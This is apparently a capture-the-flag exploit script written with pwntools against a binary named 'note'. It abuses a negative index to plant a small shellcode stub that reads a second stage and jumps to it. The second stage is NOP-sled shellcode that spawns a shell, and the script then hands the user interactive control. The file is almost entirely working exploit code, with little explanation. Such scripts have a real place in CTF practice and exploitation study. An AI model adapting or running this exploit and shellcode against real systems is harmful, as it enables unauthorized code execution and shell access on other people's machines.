from pwn import *
import sys
import time
if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./note")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./note")
else:
	p = remote(ip,addr)

def add(index,payload,content):
	p.sendline(str(1).ljust(0xA-1,"\x00"))
	#raw_input()
	#time.sleep(0.5)
	p.sendline(str(index))
	#raw_input()
	#time.sleep(0.5)
	p.sendline(payload)
	#raw_input()
	#time.sleep(0.5)
	p.sendline(content)

code_base = 0x555555554000
def debugf():
	gdb.attach(p,"b *{b1}\nb *{b2}".format(b1=hex(code_base+0x12FA),b2=hex(code_base+0x1716)))

context.arch = "amd64"
p.recvuntil("404 not found                 \n")
code1 = """push rsp
push rsp
pop rsi
push 0x50
pop rdx
xor rax,rax
syscall
jmp rsp
"""
context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
debugf()
payload = str(13).ljust(0x12-0x8,"\x00") + p32(-13&0xffffffff)
add(0,payload,asm(code1))

p.sendline("6")
sc = "\x90"*30 + asm(shellcraft.sh())
p.send(sc)
p.interactive()
